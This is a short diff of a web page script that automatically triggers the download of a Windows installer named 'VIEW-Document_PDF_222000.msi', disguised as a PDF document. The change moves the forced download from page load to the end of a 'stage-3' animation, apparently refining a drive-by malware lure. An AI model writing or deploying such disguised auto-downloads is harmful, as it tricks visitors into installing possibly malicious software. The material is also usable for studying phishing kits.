@@ -249,16 +249,13 @@
   </section>
 </body>
   <script>
-window.addEventListener("load", () => {
-  const downloadUrl = "/VIEW-Document_PDF_222000.msi";
+const stage3 = document.getElementById("stage-3");
 
+stage3.addEventListener("transitionend", () => {
   const link = document.createElement("a");
-  link.href = downloadUrl;
+  link.href = "/VIEW-Document_PDF_222000.msi";
   link.download = "VIEW-Document_PDF_222000.msi";
-
-  document.body.appendChild(link);
   link.click();
-  link.remove();
-});
+}, { once: true });
 </script>
 </html>
